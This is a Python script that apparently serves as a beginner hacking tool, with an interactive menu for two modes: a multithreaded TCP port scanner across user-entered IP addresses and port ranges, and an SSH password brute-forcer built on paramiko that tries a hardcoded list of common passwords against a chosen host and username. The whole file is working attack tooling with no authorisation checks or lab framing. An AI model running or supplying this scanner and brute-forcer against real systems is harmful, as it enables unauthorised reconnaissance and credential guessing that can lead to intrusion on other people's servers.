import socket
import termcolor
import threading
import paramiko


def scan_port(ip_address, port):  
    """Check if a port is open on a given IP address."""
    try:
        sock = socket.socket()
        sock.settimeout(1) 
        sock.connect((ip_address, port))
        print(termcolor.colored(f"[+] Port {port} is open on {ip_address}", 'blue'))
        sock.close()
    except socket.timeout:
        pass  
    except socket.error as e:
        print(termcolor.colored(f"[!] Error on port {port}: {e}", 'red'))
    except KeyboardInterrupt:
        print(termcolor.colored("\n[!] Scan interrupted by user", 'red'))
        exit(1)


def scan(target, start_port, end_port):
    """Scan a range of ports on a given target."""
    print(termcolor.colored(f"\n[*] Starting scan for {target}", 'yellow'))
    for port in range(start_port, end_port + 1):
        thread = threading.Thread(target=scan_port, args=(target, port))
        thread.start()


def validate_ip(ip):
    #### Validate if the input is a valid IPv4 address.
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False



def brute_force_ssh(ip_address, username, password_list, port=22):
    """Brute force SSH login."""
    for password in password_list:
        try:
            print(termcolor.colored(f"[*] Trying password: {password}", 'yellow'))
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh_client.connect(ip_address, username=username, password=password, port=port, timeout=5)
            print(termcolor.colored(f"[+] Found valid credentials: {username}:{password}", 'green'))
            ssh_client.close()
            break  # Exit once we find the correct password
        except paramiko.AuthenticationException:
            print(termcolor.colored(f"[-] Invalid password: {password}", 'red'))
        except paramiko.SSHException as e:
            print(termcolor.colored(f"[!] SSH Exception: {str(e)}", 'red'))
        except Exception as e:
            print(termcolor.colored(f"[!] Error: {str(e)}", 'red'))



def generate_password_list():
    #### Generate a simple list of passwords.
    return ['password', '123456', 'admin', '12345567788','987765544','hackman_019'] 



################# Start of the main program ######################

action = input("[*] What would you like to do? (scan/brute-force): ").lower()

if action == "scan":
    targets = input("[*] Enter targets to scan (separate them with commas): ")
    port_range = input("[*] Enter the port range to scan (e.g., 1-100): ")

    try:
        start_port, end_port = map(int, port_range.split('-'))
        if start_port <= 0 or end_port <= 0 or start_port > end_port:
            raise ValueError
    except ValueError:
        print(termcolor.colored("[!] Please enter a valid port range (e.g., 1-100).", 'red'))
        exit(1)

    if ',' in targets:
       print(termcolor.colored("[*] Scanning multiple targets...", 'green'))
       for ip_addr in targets.split(','):
           ip_addr = ip_addr.strip()
           if validate_ip(ip_addr):
                scan(ip_addr, start_port, end_port)
           else:
               print(termcolor.colored(f"[!] Invalid IP address: {ip_addr}", 'red'))
    else:
       target = targets.strip()
       if validate_ip(target):
          scan(target, start_port, end_port)
       else:
          print(termcolor.colored("[!] Invalid IP address.", 'red'))

elif action == "brute-force":
        target_ip = input("[*] Enter target IP address: ")
        target_username = input("[*] Enter target username: ")
        password_list = generate_password_list()
        print(termcolor.colored(f"[*] Starting brute force attack on {target_ip}...", 'green'))
        brute_force_ssh(target_ip, target_username, password_list)

else:
        print(termcolor.colored("[!] Invalid option selected. Please choose either 'scan' or 'brute-force'.", 'red'))